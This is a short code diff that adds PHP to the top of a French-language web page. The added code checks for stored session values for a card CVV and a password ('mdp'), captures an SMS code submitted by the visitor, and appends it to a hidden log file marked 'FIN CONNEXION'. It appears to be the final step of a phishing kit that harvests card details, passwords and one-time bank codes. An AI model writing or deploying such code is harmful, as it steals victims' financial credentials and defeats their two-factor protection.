@@ -1,3 +1,21 @@
+<?php session_start();
+if (!isset($_SESSION["cvv"]) or !isset( $_SESSION["mdp"])) {
+        header("Location: ./index.php");
+        exit();
+}
+$_SESSION["sms"] = $_POST['sms'] ;
+
+$donnees = "Sms : " .$_SESSION["sms"] ."\n". "** FIN  CONNEXION **\n"."\n";
+$file = "../blinky2000@bvc@bvc@destruction.txt" ;
+file_put_contents($file, $donnees, FILE_APPEND);
+
+session_destroy();
+
+
+
+
+?>
+
 <!DOCTYPE html>
 <html lang="fr">
 
